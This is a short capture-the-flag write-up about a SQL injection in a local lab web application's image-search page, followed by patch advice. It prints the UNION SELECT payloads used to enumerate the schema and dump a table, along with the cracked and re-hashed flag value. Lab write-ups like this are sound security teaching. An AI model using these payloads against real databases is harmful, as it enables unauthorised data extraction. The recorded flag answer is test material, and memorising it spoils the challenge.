# SQL injection 

### Vulnerability
in the page: `http://localhost:8080/index.php?page=searchimg&id=+&Submit=Submit#`

in the same way as in the members page we can find the flag:

get all db's find our table: `0=0 UNION SELECT COLUMN_NAME, TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS`

get the fields: `0=0 UNION SELECT title, id FROM list_images UNION SELECT title, url FROM list_images UNION SELECT title, comment FROM list_images`

and then we can find this : `If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`

apply the md5 deconding wich gives us:`albatroz`  put it to lowercase and hash it to sha256: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### PATCH

* Use Prepared Statements (Parameterized Queries).
* Validate and Sanitize Input
* Least-Privilege Database Accounts

